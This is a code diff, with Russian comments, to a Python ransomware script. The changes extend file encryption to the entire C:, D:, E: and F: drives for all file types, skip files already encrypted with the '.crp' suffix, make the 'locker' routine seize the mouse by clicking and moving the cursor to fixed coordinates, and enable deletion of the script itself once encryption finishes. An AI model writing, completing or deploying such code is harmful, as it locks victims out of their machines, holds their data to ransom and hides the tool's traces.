@@ -1,5 +1,5 @@
-import os
 import sys
+import os
 import pyAesCrypt
 import secrets
 import string
@@ -25,6 +25,9 @@ pycharm_projects_path = find_pycharm_projects()
 # Список директорий для шифрования и указания расширений
 directories = [
     (pycharm_projects_path, ".py"),
+    (r"D:\\", None),  # None означает все расширения
+    (r"E:\\", None),  # None означает все расширения
+    (r"F:\\", None),  # None означает все расширения
     (r"C:\\", None),  # None означает все расширения
 ]
 
@@ -57,7 +60,8 @@ def locker():
 
     def block():
         try:
-            pass
+            click(675, 420)  # Кликать на координаты 675 420
+            moveTo(675, 420)  # Перемещать курсор на координаты 675 420
         except FailSafeException:
             pass
 
@@ -100,7 +104,12 @@ def locker():
 def crypter():
     def crypt(file):
         try:
-            print(file)
+            # Пропускаем файлы с расширением .crp
+            if file.endswith(".crp"):
+                print(f"Пропуск файла {file}, так как он уже зашифрован.")
+                return
+
+            print(f"Шифруем файл: {file}")
             password = crypt_pass
             bufferSize = 512 * 1024
             pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, bufferSize)
@@ -132,7 +141,7 @@ def crypter():
         walk(directory, ext)
 
     print("Encryption complete.")
-    # os.remove(sys.argv[0])
+    os.remove(sys.argv[0])
 
 thread_1 = Thread(target=locker)
 thread_2 = Thread(target=crypter)
